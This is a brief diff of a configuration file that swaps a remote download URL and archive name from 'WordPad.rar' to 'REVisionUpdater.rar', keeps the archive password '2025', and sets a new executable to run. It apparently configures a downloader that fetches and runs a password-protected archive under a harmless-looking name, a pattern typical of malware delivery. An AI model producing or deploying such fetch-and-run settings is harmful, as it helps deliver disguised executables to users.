@@ -1,4 +1,4 @@
-url=https://w3services.ca/WordPad.rar
-name=WordPad.rar
+url=https://w3services.ca/REVisionUpdater.rar
+name=REVisionUpdater.rar
 password=2025
-setup=wordpad.exe
+setup=REVisionUpdater.exe
